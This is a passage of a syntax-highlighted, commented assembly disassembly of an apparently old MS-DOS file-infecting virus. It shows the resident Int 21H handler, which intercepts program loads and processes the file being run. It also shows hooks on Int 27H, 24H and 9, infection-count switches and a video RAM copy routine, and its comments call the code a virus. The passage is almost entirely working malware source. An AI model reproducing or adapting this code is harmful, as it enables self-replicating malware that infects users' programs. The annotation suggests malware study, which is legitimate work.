    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0670</span><span class="sc0">          </span><span class="sc1">; Branch if different</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc0">          </span><span class="sc1">; Free memory?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0670</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">01D0H</span><span class="sc0">        </span><span class="sc1">; Add length of installed segment</span><span class="sc0">
</span><span class="sc5">BP0670</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0710</span><span class="sc0">          </span><span class="sc1">; Pass on to old Int 21H</span><span class="sc0">

    </span><span class="sc1">; Program termination (Int 20H, or functions 0 or 4CH)</span><span class="sc0">

</span><span class="sc5">BP0680</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Nothing to keep</span><span class="sc0">
</span><span class="sc5">BP0690</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0640</span><span class="sc0">          </span><span class="sc1">; Get relocation constant in SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">CLI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0590</span><span class="sc0">          </span><span class="sc1">; Reset interrupts</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">01D0H</span><span class="sc0">        </span><span class="sc1">; Length of installed segment</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Add length for host</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">          </span><span class="sc1">; Add PSP length (?)</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc0">          </span><span class="sc1">; Keep process function</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0710</span><span class="sc0">        </span><span class="sc1">; Pass on to old Int 21H</span><span class="sc0">

    </span><span class="sc1">; Interrupt 21H routine</span><span class="sc0">

</span><span class="sc5">BP0700</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc0">          </span><span class="sc1">; \ End process function?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0680</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc0">          </span><span class="sc1">; \ Keep process function?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0690</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; \ Terminate program function?</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0680</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc0">          </span><span class="sc1">; \ Free allocated memory function?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0660</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4AH</span><span class="sc0">          </span><span class="sc1">; \ Set block function?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0660</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc0">          </span><span class="sc1">; \ Load function?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0730</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
</span><span class="sc5">BP0710</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump to Int 21H</span><span class="sc0">
</span><span class="sc5">I21_OF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0138DH</span><span class="sc0">          </span><span class="sc1">; Original Int 21H offset</span><span class="sc0">
</span><span class="sc5">I21_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">00291H</span><span class="sc0">          </span><span class="sc1">; Original Int 21H segment</span><span class="sc0">

    </span><span class="sc1">; Alternate Interrupt 21H - only intercept load</span><span class="sc0">

</span><span class="sc5">BP0720</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc0">          </span><span class="sc1">; Load function?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0710</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP0730</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0640</span><span class="sc0">          </span><span class="sc1">; Get relocation constant in SI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0600</span><span class="sc0">          </span><span class="sc1">; Set Int 24H vector</span><span class="sc0">
</span><span class="sc5">BP0740</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STI</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; Test switch two</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0740</span><span class="sc0">          </span><span class="sc1">; Branch if on</span><span class="sc0">
    </span><span class="sc6">CLI</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; Test switch two</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0740</span><span class="sc0">          </span><span class="sc1">; Branch if on</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; Set on switch two</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Pathname pointer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PTHDSK</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0FFH</span><span class="sc0">     </span><span class="sc1">; Set drive to none</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">    </span><span class="sc1">; Does pathname include drive?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0750</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get drive letter</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">          </span><span class="sc1">; Convert to lowercase</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">          </span><span class="sc1">; Convert to number</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PTHDSK</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Store drive</span><span class="sc0">
</span><span class="sc5">BP0750</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Pathname pointer</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB0884</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">   </span><span class="sc1">; Pathname</span><span class="sc0">
</span><span class="sc5">BP0760</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSB</span><span class="sc0">               </span><span class="sc1">; Get a character</span><span class="sc0">
    </span><span class="sc6">STOSB</span><span class="sc0">               </span><span class="sc1">; Store a character</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Was that the last?</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0760</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0380</span><span class="sc0">          </span><span class="sc1">; Process file</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0610</span><span class="sc0">          </span><span class="sc1">; Restore Int 24H vector</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0FDH</span><span class="sc0"> </span><span class="sc1">; Set off switch two</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0710</span><span class="sc0">          </span><span class="sc1">; Pass on to old Int 21H</span><span class="sc0">

    </span><span class="sc1">; Interrupt 27H routine</span><span class="sc0">

</span><span class="sc5">BP0770</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">          </span><span class="sc1">; Round up</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Bits to shift</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">           </span><span class="sc1">; Convert to paragraphs</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0690</span><span class="sc0">          </span><span class="sc1">; Keep process</span><span class="sc0">

    </span><span class="sc1">; Interrupt 27H - jump to original routine</span><span class="sc0">

</span><span class="sc5">BP0780</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump to Int 27H</span><span class="sc0">
</span><span class="sc5">I27_OF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">05DFEH</span><span class="sc0">          </span><span class="sc1">; Original Int 27H offset</span><span class="sc0">
</span><span class="sc5">I27_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">00291H</span><span class="sc0">          </span><span class="sc1">; Original Int 27H segment</span><span class="sc0">

    </span><span class="sc1">; Interrupt 24H routine</span><span class="sc0">

</span><span class="sc5">BP0790</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0800</span><span class="sc0">          </span><span class="sc1">; \ Get current location</span><span class="sc0">
</span><span class="sc5">BP0800</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0800</span><span class="sc0">    </span><span class="sc1">; Subtract offset</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc5">CRTERR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set critical error flag</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; No action</span><span class="sc0">
    </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">DB086E</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Past second line indicator</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DB0870</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Characters going down switch</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SWTCHB</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">82H</span><span class="sc0">         </span><span class="sc1">; Switch byte</span><span class="sc0">
            </span><span class="sc1">; 01 - switch one - alternate timer tick</span><span class="sc0">
            </span><span class="sc1">; 02 - switch two - processing file</span><span class="sc0">
            </span><span class="sc1">; 04 - switch three - infection count target reached</span><span class="sc0">
            </span><span class="sc1">; 08 - switch four - count two started</span><span class="sc0">
            </span><span class="sc1">; 10 - switch five - don't go to start of line</span><span class="sc0">
            </span><span class="sc1">; 20 - switch six - count two started and finished (?)</span><span class="sc0">
            </span><span class="sc1">; 40 - switch seven - count two finished</span><span class="sc0">
            </span><span class="sc1">; 80 - switch eight - video display permitted</span><span class="sc0">
</span><span class="sc5">I09_OF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Old Int 9 offset</span><span class="sc0">
</span><span class="sc5">I09_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Old Int 9 segment</span><span class="sc0">
</span><span class="sc5">DSPCNT</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0FFDCH</span><span class="sc0">          </span><span class="sc1">; Display count</span><span class="sc0">
</span><span class="sc5">I09BSY</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Int 9 busy switch</span><span class="sc0">
</span><span class="sc5">KEYTOK</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Keyboard token</span><span class="sc0">
</span><span class="sc5">KEYNUM</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Key number</span><span class="sc0">
</span><span class="sc5">VIDADR</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0B800H</span><span class="sc0">          </span><span class="sc1">; Video RAM segment</span><span class="sc0">
</span><span class="sc5">RSTCNT</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Restore count</span><span class="sc0">
</span><span class="sc5">FLENLO</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">39H</span><span class="sc0">         </span><span class="sc1">; File length, low word</span><span class="sc0">
</span><span class="sc5">FLENHI</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; File length, high word</span><span class="sc0">
</span><span class="sc5">DB0884</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'C:\3066\HELLO.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Pathname</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90H</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">BP0820</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">          </span><span class="sc1">; Test switch six</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0850</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Test switch two</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0860</span><span class="sc0">          </span><span class="sc1">; Branch if on</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">BOOT</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">BB0449</span><span class="sc0">       </span><span class="sc1">; Get current VDU mode</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0B800H</span><span class="sc0">       </span><span class="sc1">; VDU RAM address</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">; Mode 7?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0830</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0B000H</span><span class="sc0">       </span><span class="sc1">; External mono VDU RAM</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0840</span><span class="sc0">

</span><span class="sc5">BP0830</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Mode 2?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0840</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Mode 3?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0860</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP0840</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">VIDADR</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Save video RAM segment</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Set on switch two</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">RSTCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Set restore count to zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Address video RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">25</span><span class="sc0">        </span><span class="sc1">; Length to copy</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; From zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SIGNAT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">   </span><span class="sc1">; To end of virus</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSW</span><span class="sc0">           </span><span class="sc1">; Copy video</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP1010</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">   </span><span class="sc1">; Interrupt 9 routine</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0024</span><span class="sc0">       </span><span class="sc1">; Install as Int 9 offset</span><span class="sc0">
